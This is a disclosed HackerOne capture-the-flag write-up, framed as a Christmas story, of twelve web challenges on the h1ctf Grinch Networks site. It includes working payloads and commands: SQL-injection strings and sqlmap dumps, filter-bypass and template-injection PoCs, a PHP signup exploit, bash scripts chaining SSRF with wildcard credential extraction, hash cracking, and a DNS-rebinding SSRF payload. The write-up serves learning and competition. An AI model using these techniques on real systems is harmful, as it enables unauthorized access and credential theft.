# [h1ctf-Grinch Networks] MrR3b00t Saving the Christmas

## Report Details
- **Report ID**: 1068934
- **URL**: https://hackerone.com/reports/1068934
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-12-30T19:02:05.385Z
- **Disclosed**: 2021-01-11T22:36:53.487Z

## Reporter
- **Username**: d3f4u17
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
> Disclaimer: Certain things are a bit modified to set the pieces for the story. Also you can find the flags for all 12 challenges in file F1138300 , Now enjoy :)

```
█▀▄▀█ █▀█ ░ █▀█ █▄▄ █▀█ █▀█ ▀█▀
█░▀░█ █▀▄ ▄ █▀▄ █▄█ █▄█ █▄█ ░█░ saves the Christmas
```

**_Episode - 0x00_ Pil0t.py**

It was a gloomy clear night, Mr.R3b00t was sitting in front of the "Computer" in his  Hacker Den, sound of the keyboard clicks can be heard all around and suddenly Mr.R3b00t receives a message from none other than the mighty "h1-Team".

{F1137838}

The moment Mr.R3b00t read the message, He took an oath "Humanity has suffered a lot this year, I will not let The Grinch ruin Christmas too!, I will pawn him..(Thunder Rumbling in the background)"

**_Episode - 0x01_ r0b0ts.txt**

Mr.R3b00t pulled up his chair, put the black hoodie on (Hacker Mode initiated) and started hacking The Grinch, with such limited info and time the first thing that came into his genius mind was to do an Nmap scan on the target website, as his wise friend @ippsec once quoted, "Always perform an Nmap scan, you never know what surprise you will get" (ippsec never said that -_-).

Mr.R3b00t Performed an Nmap scan on https://hackyholidays.h1ctf.com but found nothing interesting except for one little thing!

{F1137841}

There was a robots.txt file present on the website with one disallowed entry : `/s3cr3t-ar3a` (Looks like Grinch is not good at hiding things)

To have a good look at it, Mr.R3b00t opened up the robots.txt for any additional details.

{F1137846}

The robots.txt file was leading to only one path `/s3cr3t-ar3a`, Without wasting any time Mr.R3b00t opened up the page and found the following message.

{F1137849}

Grinch was going to update the website looks like he has started off his plan, Mr.R3b00t smiled and said "This is gonna be a long Christmas..".  

**_Episode - 0x02_  .hidd3n**

Mr.R3b00t waited for a whole day and visited the `/s3cr3t-ar3a` page again, this time the page was flashing an entire new message.

{F1137850}

Soon after seeing the message, Mr.R3b00t started off with the recon to find if something is hidden in the website but **nothing interesting was found**. Clock was ticking and Mr.R3b00t was losing all hopes of saving Christmas (more like the hope of losing a private invite).

Mr.R3b00t kept thinking and searching to find a way to know what The Grinch has been hiding but nothing worked out, a ray of hope came in when Mr.R3b00t was actually able to find the true meaning of what was written on his Desktop Wallpaper.

{F1137851}

Mr.R3b00t soon contacted one of his hacker friend which was also trying to destroy Grinch's evil agenda, He told Mr.R3b00t "Not all things can be seen in the server side response, sometimes things are generated on the client's end too". It was enough for Mr.R3b00t to figure out what he was trying to say.

Mr.R3b00t quickly opened the `/s3cr3t-ar3a` and opened up the browser dev console, to search for any hidden secrets and voila.

{F1137853}

So, It was clear that The Grinch has started off his dirty games and was going to defame a list of people on his website.

**_Episode - 0x03_ id=1**

Soon after sometime, Mr.R3b00t found the list of people deployed on Grinch's website "This dirty little thing, what is he even trying to prove with this", Mr.R3b00t said.

{F1137856}

Taking a closer look Mr.R3b00t found an endpoint `/people-rater/page/1` being called on initial page load.

{F1137860}
{F1137861}

The id parameters were containing base64 strings, after decoding the first value of the id attribute, Mr.R3b00t got the following result 

{F1137888}

Rest of the decoded "id" values were having consecutive values (3,4..), Everything was looking on place except for one single thing "Where the heck is id 1 ?"

Later on, Mr.R3b00t found if you click on respective person's name a message appears for that person and a request is made to `https://hackyholidays.h1ctf.com/people-rater/entry?id={ID}` the `{ID}` was nothing but the base64 `id` values fetched earlier.

For Mr.R3b00t it was a "piece of cake" to figure out what the Grinch has been hiding here, Mr.R3b00t quickly encoded the string `{"id":1}` as base64 and sent it along with `https://hackyholidays.h1ctf.com/people-rater/entry?id={ID}`

{F1137892}

"What?? He is opening his swag shop now! What is he gonna sell? Snow Ball Launchers ?" Mr.R3b00t said.

**_Episode - 0x04_ fuZZ**

Looks like Grinch was selling some really lame stuff and of course  on his swag-shop.

{F1137893}

"Let's find out what he is hiding now", Mr.R3b00t said. 

From initial recon Mr.R3b00t found out certain API endpoint which were hidden and were not present on the site.

{F1137894}

The /api/sessions endpoint were throwing base64 encoded session strings.

{F1137895}

Mr.R3b00t quickly decoded all the strings and found out two attributes in each string "user" and "cookie", but most of the user attributes were null except for one.

{F1137899}

After spending sometime on the first endpoint it was time to move onto the second one.

An initial request to the endpoint returned the following response.

{F1137901}

Looks like the endpoint was missing some params to pass along with the request, just to be sure Mr.R3b00t also checked if any other method is allowed on the endpoint but 404 is returned, only GET was allowed on the endpoint.

It was time to enum the parameters and Mr.R3b00t had the exact tool in his arsenal that could get the work done, [Arjun](https://github.com/s0md3v/Arjun) By none other than s0md3v.

Without wasting anymore time Mr.R3b00t Fired up Arjun in his terminal and passed on the `/api/user` endpoint to look for the hidden params, just after few seconds he got the result. He found a valid parameter "uuid".

{F1137904}
{F1137905}

From the first endpoint Mr.R3b00t got a user with ID "user": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043"

At this point Mr.R3b00t exactly knew what to do next. Mr.R3b00t combined the user id with the `/user?uuid=` and BOOM!

{F1137910}

This time Mr.R3b00t has his hands on some pretty solid information about Grinch, It was Grinch's address.

"I think its time to infiltrate the fortress..", Ep04 ends.

**_Episode - 0x05_ Brut3f0rc3.py**

Being a Master in Lock Picking it was a piece of Cake for Mr.R3b00t to get into the Grinch's house. The house was a mess and full of Dog Food, and obviously no one was there.

The only thing that caught Mr.R3b00t's attention was Grinch's Computer he quickly powered up the computer but the internal web portal was password protected (Grinch is not that big of a fool as we think he is).

{F1138036}

"Hmmm, Till now he was operating from this computer", Mr.R3b00t said. Now the only way to get more info on Grinch is to hack his password.

Grinch is smart but let's see if he is smart enough to have a strong username and password. So Mr.R3b00t noticed one unusual behaviour whenever a wrong username was provided "Invalid Username" was appearing as an error, this could be the factor to bruteforce the username.

After a quick bruteforce using ffuf revealed the username as "access".

{F1138037}

Now a similar behaviour was seen with the password field, whenever Mr.R3b00t entered the username as "access" and a random password "Invalid password" error popped up.

It was time to brute force the password another quick fuzz with ffuf revealed the password as "computer".

{F1138038}

Now Mr.R3b00t was having credentials for the Grinch's Internal login portal he quickly logged in and soon enough he found that there is nothing inside it.(wait.. what??)

{F1138039}

"He must be hiding something, it can't be empty" Mr.R3b00t said with a frown on his face.

He decided to investigate deeper and found out that the session token is a base64 string with the following JSON data.

{F1138041}

Mr.R3b00t Changed admin to "true" and replayed the request and BOOM! he had access to Grinch's personal files.

{F1138043}

The zip file found was also password protected but this time Mr.R3b00t exactly knew how to open it up. Mr.R3b00t transferred the file onto his own laptop, fired up Kali and cracked the ZIP file pass using "fcrackzip".

{F1138044}

Unzipping the file revealed that Grinch is definitely not just interested in "destroying Christmas"(Naughty Grinch).

{F1138045}
{F1138046}
(This pic literally gave me nightmares.)

Mr.R3b00t took a peak in the diary.txt file and found out a link to his online diary.

{F1138056}

"This is his personal diary, I think he might have mentioned something in it about his evil plans"..Mr.R3b00t Gathered everything he can from Grinch's house put everything back to it's place and removed every possible trace...

**_Episode - 0x06_ secretadminsecretadmin.phpadminadmin.php.php.php**

A first look at Grinch's diary was not revealing anything sensitive.

{F1138063}

From initial recon Mr.R3b00t found out there are following hidden files present on the site.

{F1138065}

And the page /my-diary was always redirecting to /my-diary/?template=entries.html looked like the site is including data from other pages present in the dirs.

So index.php was present on the site but it was redirecting to /my-diary/?template=entries.html If the site is including code from other files might be possible there is also a way to read the contents of index.php

Mr.R3b00t quickly changed the "entries.html" to "index.php" and sent the request to "https://hackyholidays.h1ctf.com/my-diary/?template=index.php" and soon enough he had the source code for "index.php"

{F1138066}

"Hmmmm, so he changed the admin page to "secretadmin.php", but he is restricting the access to secretadmin.php".

The index.php was having three filters; preg_replace() which was filtering out non-alphanumeric character except for the character "." .

And two str_replace() filters to restrict access to admin.php and secretadmin.php, It was time to find out the perfect payload to bypass all the filters.

Mr.R3b00t tried multiple directory traversal payloads but nothing worked because everytime you will put a char "/" or string "admin.php" or "secretadmin.php" in the payload it will get filtered out...Looked like directory traversal isn't the way, it was time to play with the str_replace() function.

_____________________________________________________________________________________________________
## Trivia
_____________________________________________________________________________________________________

Hey! its d3f4u17 let's find out some interesting facts about `str_replace()` function.

PHP str_replace() function replace all occurrences of the search string with the replacement string.

Example :-
```php
php > $y="hello grinch"; 
php > $x=str_replace("grinch", "", $y);
php > echo $x;
hello
```
In the above example, str_replace() will remove all occurrences of the string "grinch" with "" in the string "hello grinch".

But still a properly crafted input can bypass the replace filter for example:- the input string "hello grincgrinchh" when passed through str_replace("grinch", "", $y); will give "hello grinch" as output. Similar technique was used to bypass the str_replace() filters for this challenge.

{F1138067}
_____________________________________________________________________________________________________

After trying some test inputs Mr.R3b00t found the ultimate payload to bypass both the str_replace() filters

```
secretadminsecretadmin.phpadminadmin.php.php.php
```

When the above payload will be passed through the first filter `$page = str_replace("admin.php","",$page);` the resultant string would be "secretadminsecretadmin.php.php"

Now when the string "secretadminsecretadmin.php.php" will pass through the second filter the resultant string would be "secretadmin.php". Now Mr.R3b00t had the perfect payload he quickly added the payload to ?template= param and sent the request to https://hackyholidays.h1ctf.com/my-diary/?template=secretadminsecretadmin.phpadminadmin.php.php.php

The payload worked and The admin page loaded..

{F1138078}

A draft was present on the admin dashboard and it was revealing the ultimate plan of The Grinch to ruin this year's christmas. "This is horrible! Is this what he is planning? If he succeeds Santa won't be able to distribute the presents, I have to stop him"..

Mr.R3b00t now knew what the Grinch was planning, will he be able to stop him? Will Grinch succeed in his evil agenda?? We will find out soon..

**_Episode - 0x07_ Inj3cti0n**

Few hours pass by, no strange activities were found on the Grinch Network. Ping!! A email notification came in, Mr.R3b00t checked the mail.

{F1138081}

"What?? How did he get my mail?? Does he know I am after him??" Looks like Mr.R3b00t was not the only one who got the mail, Mr.R3b00t's friends also got the mail, Grinch was sending mass mail to Christmas loving People.

So if he is sending mail there has to be someplace from where he is doing it, It took Mr.R3b00t few seconds to find out the mail generating portal https://hackyholidays.h1ctf.com/mail-generator

Mr.R3b00t soon found out the template he used to Generate the mass mail.

{F1138082}

The message contained a markup with placeholders {{name}} and {{template:}} which was including some kind of html file inside the body.

It's a thumb rule for Mr.R3b00t to do a dirsearch with it's in-built wordlist in the initial recon process, and it never disappoints. The dirsearch reveals a hidden directory "templates".

{F1138085}

The templates folder revealed some HTML files two of them were used in the previously drafted mail.

{F1138086}

The one that caught Mr.R3b00t's interest was the third one 

`38dhs_admins_only_header.html` (The word admin always excite him)

Now, Mr.R3b00t needs to find a way to use this template.

Exploring the other features, Mr.R3b00t found out that one can also craft a mail template at https://hackyholidays.h1ctf.com/hate-mail-generator/new and can preview it at https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview

The initial request to the /preview looked as below:-

{F1138087}

Mr.R3b00t quickly tried using the `{{template:}}` placeholder to include the file 38dhs_admins_only_header.html but it wasn't that simple

{F1138093}

A permission denied error popped up.

After playing with the parameters, Mr.R3b00t found that custom params can be defined in the `preview_data` POST param and then can be used in `preview_markup`. E.g.

{F1138095}

One more thing that needs to be observed was whatever input was given in the placeholder was getting reflected as it is without any filters.

{F1138096}

After trying few payloads, Mr.R3b00t said "If everything is getting reflected why not pass the template placeholder itself in the custom placeholder".

Mr.R3b00t tried the payload `{"test":"{{template:38dhs_admins_only_header.html}}"}` and it worked like a charm.

Final PoC:-

```bash
curl -X POST -sk -H "Content-Type: application/x-www-form-urlencoded" -d 'preview_markup=Hello+{{test}}+&preview_data={"test":"{{template:38dhs_admins_only_header.html}}"}' https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview | grep -Eoi "flag{[^>]+}"
```
{F1138099}
{F1138098}

"Adam?? This can't be true, was he helping The Grinch all this time?" it was a total shock for Mr.R3b00t. Adam is a renowned CTF creator in cybersecurity world and a close friend of Mr.R3b00t(I don't know about Mr.R3b00t, but Adam ain't a friend of mine but I would love to be his friend :) )...episode ends.

**_Episode - 0x08_ B3tR4y4l**

It wasn't time for Mr.R3b00t to think about what Adam did but to focus on the plan to stop Grinch. The forum was already online.

{F1138116}

Initial recon on the forum revealed a phpmyadmin page and a login page for users and also might be for admins, Mr.R3b00t tried bypassing the login using bruteforcing user and pass, default creds, older version CVEs but nothing worked. Also, IDORs were also not the case with this one.

{F1138118}

"I think it's time to hack Adam "Mr.R3b00t quickly started looking for Adam's online activities(Thanks @chron0x for the hint on this one :) ) soon enough Mr.R3b00t found Adam's Github profile https://github.com/adamtlangley There wasn't any thing suspicious in his repositories but you know Github is all about contribution, Adam's latest activities revealed a commit to "Grinch-Networks" Github profile.

{F1138119}

"Mr.R3b00t at this point of time was 100% sure about Adam's involvement in the Grinch's plan".

Mr.R3b00t opened the repo https://github.com/Grinch-Networks/forum , The forum was written in PHP after looking at some files in the source code Mr.R3b00t was sure that DB interaction is taking place in the forum app, now if there is a DB there has to be a connection file for it.

Soon enough Mr.R3b00t found the DB.php file inside the repo which would be getting used to make connection with the backend database, It was time to see if there are any credentials present for the DB or not.

{F1138120}

"After all it's Adam, he won't do a rookie mistake like that", Mr.R3b00t said. 

MR.R3b00t was going back and take a look at other files but his sharp vision found this.

{F1138122}
{F1138123}

There was an inital commit for the file DB.php, after looking at the history of DB.php Mr.R3b00t went to the exact same line and this time he found the DB creds. 

https://github.com/Grinch-Networks/forum/commit/07799dce61d7c3add39d435bdac534097de404dc#diff-998930400b08c30f6949f365207fd1d0c693d22ae5de6b9de752ef5c57ce9754R134

{F1138124}

"After all, Git is nothing but a stupid content tracker", Mr.R3b00t said. In his initial recon Mr.R3b00t found a phpmyadmin page on the forum, he tried the creds over there and it worked like a charm.

The DB user had access to the "users" table, the table was having username and hashed passwords.

{F1138126}

Cracking the hashes revealed the password for the user "grinch"

{F1138127}

It was time to login to the admin account using creds "grinch:BahHumbug", The admin account was having a post under "secret plans".

{F1138128}

From this moment onwards it was a race against time for Mr.R3b00t as Grinch has already deployed his recon servers once he gets his hands on Santa's IPs he will launch the DDoS attack.

**_Episode - 0x09_ sl33p**

Mr.R3b00t now have to find a way to access The recon servers but no initial links were found, Grinch was now running a Quiz on his website "Sadistic evil creep", Mr.R3b00t took a look at it in hope of finding a lead on the recon servers.

{F1138130}

At first Glance, it looked like a normal quiz with some crazy questions and options(What do you expect from a Green Ugly Monster) and an admin login page.

On a bit deep investigation Mr.R3b00t found out the flow of the quiz

```
--> /evil-quiz/ --> /evil-quiz/start/ --> /evil-quiz/score 
```

The following requests were being made on each step.

{F1138131}
{F1138132}
{F1138133}

One more thing Mr.R3b00t noted was that the 'name' param was getting reflected at the `/evil-quiz/score` page.

It was time to fuzz the parameters, soon enough Mr.R3b00t found an unusual behaviour the payload `' or (select sleep(15))-- -` when passed via name parameter was taking much time to return the response as compared to others at this point Mr.R3b00t was a bit sure about the possible vulnerability behind the behaviour.

Mr.R3b00t quickly fired up SQLmap and ran the following command.

```
$python3 sqlmap.py -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=chron0x" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=<session_cookie>" --current-db
```

Soon Mr.R3b00t assumptions became true, and he was sure that it is indeed a Time-Based SQLi

{F1138139}

Mr.R3b00t was able to find the DB name as "quiz", now it was time to enumerate tables 

```
$python3 sqlmap.py -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=chron0x" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=<session_cookie>" -D quiz --dump
```

The above sqlmap revealed two tables "sessions and "admin", looking at the content of "sessions", the table was not of much use so MR.R3b00t had the target table to look at.

```
$python3 sqlmap.py -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=chron0x" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=<session_cookie>" -D quiz -T admin --dump
```

The table admin dumped the admin credentials

{F1138143}

Mr.R3b00t logged in to the admin panel using the extracted Creds.

{F1138144}

**_Episode - 0xA_ H4ck3rz for Hire**

Grinch has speed up the process and has started hiring people on his website for his DDoS attack. Mr.R3b00t is still looking for clues to have access on Grinch's Recon server.

The page had a registration form and a login form.

{F1138145}

The basic flow was, a user can register and then login on the page, after login the user was shown the following message.

{F1138146}

Initial recon revealed the following files and directories.

> Tip: For quick finds use dirsearch, it's an amazing tool with an in-built oneforall wordlist.

{F1138148}

Both user.php and index.php were flashing the error "You cannot access this page directly" when visited directly. The README.md file was a gold mine though, it revealed a "signup-manager" app which has been deployed on the site, the readme file had the usage and install instructions along with the default creds for the admin but as expected default creds were not working.

{F1138150}

After reading the install instructions Mr.R3b00t found out that signupmanager.zip needs to be moved and unzip in the installation directory, there was a possibility that the file could be still present on the server. So MR.R3b00t requested the following URL https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip and voila Mr.R3b00t was able to download signupmanager.zip file.

The zip file contained the source code of the signup app.

{F1138152}

Now to find the perfect exploit Mr.R3b00t ran the app on his local machine and performed some basic actions such as login, register etc.

The app was storing the users credentials in a file "users.txt" instead of a database, The file had the following format to store the user info.

{F1138153}

There is one more thing that needed to be observed from the README.md file , it was mentioned in the file that "You can make anyone an admin by changing the last character in the users.txt file to a Y" by d3f4u17 the last character was being set as 'N' for non-admin users.

"If somehow I can overwrite the last character to 'Y' I can register as an admin",Mr.R3b00t said. The theory was accurate for an exploit but there were multiple restrictions imposed in the code to do so.

In the index.php file, the `addUser` function is formatting and padding all the parameters except for the hashed password as it is a constant 32 char string. In the end a sub-string of length 113 was being extracted from the final string.

{F1138154}

There were also validations in place to check for the length of the passed parameters for the user signup code

{F1138155}

Every parameter was getting passed through substr() function to make sure that the params do not exceed their specified length except for one, the parameter "age", one more thing that need to be noticed is that param "age" is getting validated by strlen() , is_numeric() and in the end intval() function was being used to fetch the integer value for the passed age value.

Mr.R3b00t decided to play with these three functions, After some research Mr.R3b00t found out that there are ways in PHP to express larger values in a shorter form.

For example "1e3" in PHP represents 1 x 10^3. Also, it can bypass both strlen and is_numeric.

{F1138156}

Mr.R3b00t now have the perfect exploit in hand, the following values will do the Job and would overwrite the last character.

```
curl 'http://localhost/signupmanager/' -H 'Content-Type: application/x-www-form-urlencoded' -d 'action=signup&username=test123&password=password&age=1e9&firstname=foo&lastname=mypayloaY'
```

When the above values will be passed the values in the variables will be as shown below

{F1138160}

The substr function will extract only the 113 characters from the resultant string which will make char 'Y' from the lastname param as the ending character.

```
test123########5f4dcc3b5aa765d61d8327deb882cf99d81fac0b735b75cfae76604798479b6d1000000000foo############mypayloaY
```

It was time to test the exploit on the actual website, Mr.R3b00t passed the following request and got successfully redirected to the Admin page.

{F1138164}
{F1138168}

Mr.R3b00t finally had the lead on the recon server The admin area was having the link for the recon server https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59, It was time for the final showdown.

**_Episode - 0xB_ Inc3pti0n**

Mr.R3b00t now have access to the recon server but he still needs to stop the DDoS, the site https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59 was having some albums and photos of Santa(Does he hate him or obsessed with him??) that Grinch collected over the years and our lovely login page "Attack box".

From initial recon Mr.R3b00t found out the following information

{F1138169}

The /uploads/ dir was giving a 403 and the /api/ endpoint has some sort of API docs for the site.

{F1138170}

Enumerating the API endpoint always resulted in a 401 unauthorised, So Mr.R3b00t had to find a way to bypass this restriction so that he can enumerate the endpoints for /api/* other things that Mr.R3b00t found out, the site was having albums and albums were having photos.

For fetching an album the following request was being made  https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k and for fetching the pictures the following request was being made https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzEzZDc0NTU0YzMwZTEwNjk3MTRhNWE5ZWRkYThjOTRkLmpwZyIsImF1dGgiOiI5NGZiMzk4ZDc4YjM2ZTdjMDc5ZTc1NjBjZTlkZjcyMSJ9

On decoding the base64 The following JSON string was obtained.

```json
{"image":"r3c0n_server_4fdk59\/uploads\/13d74554c30e1069714a5a9edda8c94d.jpg","auth":"94fb398d78b36e7c079e7560ce9df721"}
```
Looks like internal URL calling was being done, also an "auth" key was being passed , changing the path in the "image" key resulted in "invalid authenticated hash" error, somehow the "image" and "auth" keys were associated.

{F1138171}

After playing around for sometime Mr.R3b00t finally got a lead. The "hash" param was vulnerable to SQL injection, The request to `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27%20UNION%20SELECT%201,NULL,NULL;--` was returning all the photos present in the first album

Similarly, the request to `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27%20UNION%20SELECT%202,NULL,NULL;--` was returning photos from the second album.

Soon after this, Mr.R3b00t fired up sqlmap and excute the following command

```
Python3 sqlmap.py -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --method get -p "hash" --dbs
```

The param was indeed vulnerable to sqli, sqlmap dumped two databases.

{F1138173}

"recon" was kinda interesting, Next off it was time to dump the tables for "recon".

{F1138172}

"It is making total sense now! Now I know why the request was dumping the photos for the first album" ..Mr.R3b00t said

___________________________________________________________________________________________________
## Trivia
___________________________________________________________________________________________________

Hey! It's d3f4u17 again, Let me explain you what Mr.R3b00t understood after looking at the dumped schema.

The request that Mr.R3b00t made earlier `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27%20UNION%20SELECT%201,NULL,NULL;--` was exploiting the query which was being used in the backend for the table "album".

So the query that might be getting used in the backend would be something like this

```sql
select id, hash, name from album where hash='?';
```

Now these are the payloads that helped MrR3b00t identifying the correct column count.

```sql
' UNION select NULL;-- --> 404
' UNION select NULL,NULL;-- --> 404
' UNION select NULL,NULL,NULL;-- --> 200; column count is three
' UNION select NULL,NULL,NULL,NULL;-- --> 404
```

Once Mr.R3b00t had the column count he started fuzzing the first column and the payload `' UNION select 1,NULL,NULL;--` returned the photos from the first album.

Now if we append our payload `' UNION select 1, NULL, NULL;--` it will make the resultant query as:-

```sql
select id, hash, name from album where hash='' UNION select 1, NULL, NULL;--
```

The above query when executed will generate the following data.

```
MariaDB [test]> select id, hash, name from album UNION select 1,null,null;
+----+------+------+
| id | hash | name |
+----+------+------+
|  1 | NULL | NULL |
+----+------+------+
1 row in set (0.002 sec)
```

Also the column count in the union must be matching otherwise error will popup at the backend which is nothing but the 404 page.

But if we will request the following `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27%20UNION%20SELECT%201,NULL,NULL;--` the page is returning the images, this behaviour suggests that there is more than one query which is getting executed in the background because the first query is just returning the 'id' column.

Now if I am right the second query that might be executing to fetch the images from the "photo" table would be.

`select id, album_id, photo from photo where album_id='?'`, now the id column from the output of first query is being fed to the second query to get the photos.

So if we will provide a  payload something like below

```
MariaDB [test]> select id, hash, name from album UNION select "' UNION select null,null,'xyz.jpg'",null,null;
+------------------------------------+------+------+
| id                                 | hash | name |
+------------------------------------+------+------+
| ' UNION select null,null,'xyz.jpg' | NULL | NULL |
+------------------------------------+------+------+
1 row in set (0.108 sec)
```

Now the payload `' UNION select null,null,'xyz.jpg'` will be fed to the second query which will make it .

```
select id, album_id, photo from photo where album_id='' UNION select null,null,'xyz.jpg'

MariaDB [test]> select id, album_id, photo from photo where album_id='' UNION select null,null,'xyz.jpg'
    -> ;
+------+----------+---------+
| id   | album_id | photo   |
+------+----------+---------+
| NULL |     NULL | xyz.jpg |
+------+----------+---------+
1 row in set (0.078 sec)
```

Now if we will request `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=' UNION SELECT "' UNION select NULL,NULL,'xyz.jpg';--",NULL,NULL;--`

We will get the following response

{F1138181}

Decoding the base64 will give the following output.

```json
{"image":"r3c0n_server_4fdk59\/uploads\/xyz.jpg","auth":"5717163084e61f4b89336af25ae5d503"}
```

As you can see the xyz.jpg provided in the payload is getting reflected in the base64 string the "auth" token for the respective path is also being generated by the server , what if we provide "../api/test" in our payload

{F1138183}

So we can now alter the path in the "image" also, requesting the URL https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL3h5ei5qcGciLCJhdXRoIjoiNTcxNzE2MzA4NGU2MWY0Yjg5MzM2YWYyNWFlNWQ1MDMifQ== will now give the response as "Expected HTTP status 200, Received: 404"

Looks like we are now able to successfully call the /api/* endpoints from internal server.

Also the api document suggests that 404 refers to no valid endpoint, It was time for sum fuzzing. Now let's get back to the story..
___________________________________________________________________________________________________________

Mr.R3b00t decided to create the script F1138199 to automate the process of enumerating the api endpoints.

```bash
#!/bin/bash

YELLOW="\e[93m"
NORMAL="\e[39m"

OP=`curl -sgi "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=x' UNION SELECT \"' UNION SELECT null,null,'$1'--+\",null,null--+" | grep -Eoi "src=\"\/r[^+]+\"" | cut -d '"' -f 2`
OP_TWO=`curl -GkLs "https://hackyholidays.h1ctf.com$OP"`
echo -e "${YELLOW}[$1]${NORMAL} : $OP_TWO"
```

Using a proper wordlist from seclist did the JOB and  Mr.R3b00t found two valid endpoints

```bash
cat /usr/share/seclists/Discover/Web-Content/api/objects/txt | xargs -n 1 -P 20 -I {} ./newscript.sh ../api/{}
```
{F1138187}
{F1138187}

Mr.R3b00t now had the valid endpoints, now the next step was to enumerate the params endpoints

```bash
cat /usr/share/seclists/Discover/Web-Content/api/objects/txt | xargs -n 1 -P 20 -I {} ./newscript.sh ../api/user?{}=
```

{F1138196}
{F1138197}

The params "username" and "password" were two valid params for the endpoint /api/user. No valid endpoints were found on the /api/ping param though.

Trying bruteforcing username and password didn't work out but while fuzzing the params Mr.R3b00t found out that '%' sign is allowed as a wildcard.

{F1138194}

"Boolean based character matching" can be done using this behaviour, Mr.R3b00t quickly created a new script F1138200 to enumerate username and password.

```bash
#!/bin/bash

OP=""
USER=""
CHAR=""
VALID=""

echo -e "extracting $1.."

while [ 1 ]; do
for i in $(cat chars); do
    OP=`./newscript.sh ../api/user?$1=$CHAR$i%25 | grep -oi invalid | wc -c`
    #echo -e "Testing -> $CHAR$i"
    if [[ $OP -eq 8 ]]; then
        #echo -e "Testing -> $CHAR$i"
        CHAR="$CHAR$i"
        echo -e "Found -> $CHAR"
        break
    fi
done
done
```
After executing the above script in just few minutes Mr.R3b00t had both username and password for the "attack box".

{F1138206}
{F1138205}

Without wasting anymore time Mr.R3b00t logged in to the attackbox using the creds "grinchadmin:s4nt4sucks" and what he saw next was pure horror.."Grinch has found Santa's IPs", Mr.R3b00t said.

**_Episode - 0xC_ 404 Not Found**

Grinch has found Santa's IPs and is ready to launch the attack, Mr.R3b00t have to stop the Grinch before the DDoS succeeds.

{F1138263}

Without wasting anymore time Mr.R3b00t started recon and looking for a loop hole in the recon app.

The "attack" button in front of each IP was launching DDoS against mentioned IP by requesting the following URL. https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==

Decoding the base64 in the query string gives the following JSON String.

```json
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

The key "target" was holding the target IP and the key "hash" was holding a token associated with the IP, Changing the IP and replaying the request gave the following error

{F1138267}

The "hash" was associated with the "target" just like we saw earlier.

After trying multiple things Mr.R3b00t was completely blank as nothing was working or exploitable, time was running out at anytime the attack could be launched.

The only last resort remaining was  to crack the hashes Mr.R3b00t wasn;t expecting much from this but he wasn't having any other choice.

Mr.R3b00t fired up hashcat and ran the following commandf ro cracking MD5s.

```
hashcat -m0 -o crack.txt -O 5f2940d65ca4140cc18d0878bc398955 /usr/share/wordlists/rockyou.txt
```

But as expected It didn't work out. "Wait! what if the hashes are salted?", Mr.R3b00t said.

Just to try his luck Mr.R3b00t tried again and assumed the salt as the target IP.

```
hashcat -m10 -O -o crack.txt 5f2940d65ca4140cc18d0878bc398955:203.0.113.33 /usr/share/wordlists/rockyou.txt
```

And miraculously, it worked! Mr.R3b00t found the hidden salt "mrgrinch463".

{F1138269}

Mr.R3b00t now have the salt it was time to test it,  Mr.R3b00t quickly generated a hash to target the loopback IP.

```
php > echo md5("mrgrinch463127.0.0.1");
3e3f8df1658372edf0214e202acb460b
php >

```
Mr.R3b00t was able to bypass the "Invalid protection hash" error but got restricted again as there were restrictions to launch attack on internal IPs.

{F1138271}
{F1138272}

After multiple failed attempt to target the internal host, Mr.R3b00t decided to do a bit research and few minutes later found this https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypassing-using-dns-rebinding-toctou

There was a way to target Internal IP using DNS rebinding, Mr.R3b00t used a service https://lock.cmpxchg8b.com/rebinder.html (didn't use 1u.ms as it is very buggy)
Mr.R3b00t hashed the target host and made the final payload(The payload of destruction).

https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIwMTAyMDMwNC43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiI2OWMzMWNkY2ZhZDNlZjFkZWI2NTJmNGFjYTUyZDJjYyJ9

After loading the above URL twice Mr.R3b00t saw and end to Grinch's agenda.

{F1138275}

"Finally! It's over..",Mr.R3b00t smiled. He successfully took down the Grinch and respected his vow.

## Impact

h1ctf grinch network CTF writeup.

## Attachments
- message.PNG
- nmap.PNG
- robots.png
- s3cr3t.PNG
- comeback2mrw.PNG
- rayofhope.PNG
- freaks.png
- home.PNG
- home-resp.PNG
- home-spi-trdp.PNG
- decode.PNG
- message.PNG
- swag-sjop.PNG
